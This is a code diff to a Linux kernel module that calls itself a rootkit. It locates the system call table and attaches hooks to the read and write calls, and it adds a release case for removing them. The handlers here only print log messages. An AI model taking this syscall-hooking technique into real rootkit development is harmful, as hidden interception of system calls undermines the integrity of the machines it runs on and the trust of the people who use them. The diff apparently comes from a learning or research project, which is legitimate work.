@@ -7,20 +7,16 @@
 #include "rootkitops.h"
 #include "helper.h"
 
-static void funny_joke(struct pt_regs * regs){
-    printk(KERN_INFO "[peiwithhao rootkit] \n\n");
-    printk(KERN_INFO "rdi = %lx", regs->di);
-    printk(KERN_INFO "rsi = %lx", regs->si);
-    printk(KERN_INFO "rdx = %lx", regs->dx);
-    printk(KERN_INFO "rcx = %lx", regs->cx);
-    printk(KERN_INFO "r8 = %lx", regs->r8);
-    printk(KERN_INFO "r9 = %lx", regs->r9);
+
+static void hook_read(struct pt_regs *regs){
+    printk(KERN_INFO "[peiwithhao rootkit] read hooker\n\n");
+}
+
+static void hook_write(struct pt_regs *regs){
+    printk(KERN_INFO "[peiwithhao rootkit] write hooker\n\n");
 }
 
 
-static void poor_joke(struct pt_regs * regs){
-    printk(KERN_INFO "[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;(");
-}
 
 
 ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
@@ -31,7 +27,7 @@ ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t coun
     return 0;
 }
 
-struct hook_context getdents_hook_ctx;
+struct hook_context write_hook_ctx;
 struct hook_context read_hook_ctx;
 long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
     size_t hooked_addr;
@@ -48,9 +44,13 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
             sys_call_table_finder();
             hooked_addr = ((size_t *)syscall_table_addr)[217];
             //orig_modifier(hooked_addr, (size_t)&funny_joke);
-            orig_modifier(&getdents_hook_ctx, (size_t)hooked_addr, 0, (size_t)poor_joke);
-            orig_modifier(&read_hook_ctx, (size_t)((size_t *)syscall_table_addr)[1], (size_t)&funny_joke, 0);
+            hookpoint_add(&write_hook_ctx, (size_t)((size_t *)syscall_table_addr)[0], (size_t)&hook_read, 0);
+            hookpoint_add(&read_hook_ctx, (size_t)((size_t *)syscall_table_addr)[1], (size_t)&hook_write, 0);
             break;
+        case HOOK_RELEASE:
+            hookpoint_del(&read_hook_ctx);
+            hookpoint_del(&write_hook_ctx);
+            
         default:
             break;
     }
